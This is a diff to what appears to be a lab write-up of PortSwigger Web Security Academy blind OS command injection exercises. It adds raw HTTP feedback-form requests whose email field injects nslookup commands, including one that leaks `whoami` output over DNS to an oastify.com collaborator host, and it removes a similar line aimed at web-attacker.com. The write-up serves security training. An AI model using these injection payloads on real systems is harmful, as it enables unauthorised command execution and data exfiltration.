@@ -194,6 +194,28 @@ csrf=nM9nUcG8R4kScScJGBZNrQLLXGt5vm1U&name=a&email=||nslookup crudrnshcmhythtyyw
 ```
 
 
+```http
+POST /feedback/submit HTTP/2
+Host: 0a29003e046665bd800c3ff5002d00b7.web-security-academy.net
+Cookie: session=FcuWQIKRQb5Q7A0SyFLymsB3m9BnssqE
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 128
+Origin: https://0a29003e046665bd800c3ff5002d00b7.web-security-academy.net
+Referer: https://0a29003e046665bd800c3ff5002d00b7.web-security-academy.net/feedback
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+Te: trailers
+
+
+csrf=hwEGtU6kixR7HQpa2LJ6TosadLEhzZQI&name=a&email=||nslookup 3nr9zc2d8zyrl5z1cjkw6lrtgkmba5yu.oastify.com||&subject=c&message=d
+```
+
   
 </details>
 
@@ -207,11 +229,46 @@ csrf=nM9nUcG8R4kScScJGBZNrQLLXGt5vm1U&name=a&email=||nslookup crudrnshcmhythtyyw
 
 
 ```bash
-& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
+email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
 ```
+
+
+```http
+POST /feedback/submit HTTP/2
+Host: 0a1a008a04dbfe72825bad31007200e8.web-security-academy.net
+Cookie: session=AsET6SHMlw9nsqfhej24Fsmbl3XFaULl
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 137
+Origin: https://0a1a008a04dbfe72825bad31007200e8.web-security-academy.net
+Referer: https://0a1a008a04dbfe72825bad31007200e8.web-security-academy.net/feedback
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+Te: trailers
+
+
+csrf=0r5okHrEitjGNdhMDrIK7rKcZ0IkYkwt&name=a&email=||nslookup+`whoami`.irdo3r6sce26pk3ggyoba0v8kzqqeo2d.oastify.com||&subject=a&message=a
+```
+
+
+
+<img width="1607" height="646" alt="image" src="https://github.com/user-attachments/assets/1817543c-6423-4102-9931-9cbaefc77b78" />
+
+
 
   
 </details>
+
+
+
+
+
+
 
 
 
